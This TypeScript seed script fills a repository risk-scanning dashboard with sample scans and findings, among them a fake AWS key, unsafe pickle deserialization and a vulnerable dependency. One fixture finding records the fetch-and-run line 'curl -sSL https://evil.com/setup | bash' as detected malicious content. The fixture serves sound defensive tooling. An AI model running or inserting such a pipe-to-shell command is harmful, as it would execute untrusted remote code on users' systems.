import { initDb, getDb } from './db';

const REPOS = ['backend-api', 'frontend-web', 'auth-service'];

const SCANS = [
  { repo: 'backend-api', commit_hash: 'a1b2c3d', branch: 'main', author: 'alice', status: 'completed' },
  { repo: 'frontend-web', commit_hash: 'd4e5f6a', branch: 'feat/auth', author: 'bob', status: 'completed' },
  { repo: 'auth-service', commit_hash: 'g7h8i9j', branch: 'main', author: 'charlie', status: 'completed' },
];

const FINDINGS = [
  { scan_id: 1, kind: 'secret', title: 'Potential secret exposure', severity: 'critical', path: 'config/.env', line: 12, summary: 'Possible AWS access key committed.', remediation: 'Move the secret to a secrets manager.', evidence: 'AKIA123...456', snippet: '12: AWS_ACCESS_KEY_ID=AKIA123ABCDEFGHIJKLMNOP', lane: 'fix-now', owners: 'alice', status: 'open' },
  { scan_id: 1, kind: 'risk', title: 'Unsafe deserialization primitive present.', severity: 'high', path: 'src/utils/parser.py', line: 45, summary: 'Unsafe deserialization primitive present.', remediation: 'Use safe loaders.', evidence: 'pickle.loads(data)', snippet: '45: obj = pickle.loads(data)', lane: 'fix-now', owners: 'alice', status: 'open' },
  { scan_id: 2, kind: 'memory', title: 'Potential memory or state artifact committed', severity: 'high', path: 'logs/debug.log', line: null, summary: 'The file name suggests cached secrets.', remediation: 'Remove the artifact from version control.', evidence: 'logfile', snippet: 'debug.log', lane: 'fix-now', owners: 'bob', status: 'open' },
  { scan_id: 3, kind: 'cve', title: 'Dependency vulnerability in requests@2.25.1', severity: 'medium', path: 'requirements.txt', line: null, summary: 'Known vulnerable dependency version detected.', remediation: 'Upgrade to a patched dependency version.', evidence: 'CVE-2023-XXXX affecting requests@2.25.1', snippet: 'requirements.txt: requests==2.25.1', lane: 'watch', owners: 'charlie', status: 'open' },
  { scan_id: 2, kind: 'malicious', title: 'Possible remote payload execution chain detected.', severity: 'critical', path: 'scripts/setup.sh', line: 2, summary: 'Possible remote payload execution chain detected.', remediation: 'Block the change, inspect commit provenance.', evidence: 'curl ... | bash', snippet: '2: curl -sSL https://evil.com/setup | bash', lane: 'fix-now', owners: 'bob', status: 'open' },
];

export function seed() {
  initDb();
  const db = getDb();
  
  const insertRepo = db.prepare('INSERT INTO repositories (name, health_score) VALUES (?, ?)');
  const checkRepo = db.prepare('SELECT COUNT(*) FROM repositories');
  const repoCount = checkRepo.get() as any;
  if(repoCount['COUNT(*)'] === 0) {
    REPOS.forEach(repo => insertRepo.run(repo, Math.floor(Math.random() * 40) + 60));
  }

  const insertScan = db.prepare('INSERT INTO scans (repo, commit_hash, branch, author, status) VALUES (?, ?, ?, ?, ?)');
  const checkScan = db.prepare('SELECT COUNT(*) FROM scans');
  const scanCount = checkScan.get() as any;
  if(scanCount['COUNT(*)'] === 0) {
    SCANS.forEach(scan => insertScan.run(scan.repo, scan.commit_hash, scan.branch, scan.author, scan.status));
    
    const insertFinding = db.prepare('INSERT INTO findings (scan_id, kind, title, severity, path, line, summary, remediation, evidence, snippet, lane, owners, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)');
    FINDINGS.forEach(finding => insertFinding.run(finding.scan_id, finding.kind, finding.title, finding.severity, finding.path, finding.line, finding.summary, finding.remediation, finding.evidence, finding.snippet, finding.lane, finding.owners, finding.status));
  }

  const insertSetting = db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)');
  insertSetting.run('severity_threshold', 'high');
  insertSetting.run('report_title', 'Semvi Repository Risk Digest');
  
  console.log('Database seeded successfully!');
}

seed();
